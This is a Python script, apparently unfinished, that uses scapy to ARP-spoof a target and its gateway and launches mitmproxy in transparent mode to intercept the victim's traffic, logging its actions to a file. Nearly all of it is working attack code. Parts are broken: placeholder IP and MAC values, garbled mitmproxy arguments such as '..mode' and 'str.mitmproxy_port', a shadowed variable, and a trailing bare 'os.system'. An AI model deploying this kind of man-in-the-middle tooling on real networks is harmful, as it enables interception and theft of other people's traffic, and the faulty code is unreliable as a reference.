from scapy.all import ARP, Ether, sendp, sniff, conf, srp, IP, TCP, sr1, DNS, DNSQR

import time
import sys
import threading
import os
import subprocess
import datetime
import requests

conf.verb = 0

interface = "wlo1"

gateway_ip = "10.0.0.1"
target_ip = "1"
attacker_mac = "myMAc"
mitmproxy_port = 8080

def log_to_file(message):
    with open("traffic_log.txt", "a") as f:
        timestamp = datetime.datetime.now()
        f.write(f"[{timestamp}] {message}\n")

# ARP Spoofing function

def spoof(target_ip, spoof_ip, target_mac):
    ether = Ether(dst=target_mac, src = attacker_mac)
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    packet = ether / arp
    sendp(packet, iface=interface)
    msg = f"Spoofing {target_ip} <- {spoof_ip}"
    print(msg)
    log_to_file(msg)

def restore(target_ip, spoof_ip, target_mac, spoof_mac):
    ether = Ether(dst=target_mac, src = spoof_mac)
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    packet = ether / arp
    sendp(packet, count=4, iface=interface)
    msg = f"Spoofing {target_ip} -> {spoof_ip}"
    print(msg)
    log_to_file(msg)

def get_mac(ip):
    arp_request = Ether(dst= 'ff:ff:ff:ff:ff:ff') / ARP(pdst=ip)
    result = srp (arp_request, timeout=2, iface=interface)[0]
    return result[0][1].hwsrc if result else None
# Continue spoofing
def start_spoofing(target_mac, gateway_mac):
    try:
        while True:
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            time.sleep(2)
    except Exception as e:
        msg = f"Spoofing error: {e}"
        print()
        log_to_file(msg)

def start_mitmproxy():
    msg = f"mitmproxy: {mitmproxy_port}: is running"
    print(msg)
    log_to_file(msg)
    mitmproxy_port = subprocess.Popen(
        ["mitmproxy", "..mode", "transparent", "...listen port", str.mitmproxy_port],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    time.sleep(2)
    return mitmproxy_port

def setup_iptables():
    msg = "iptables setting up..."
    print(msg)
    log_to_file(msg)
    os.system
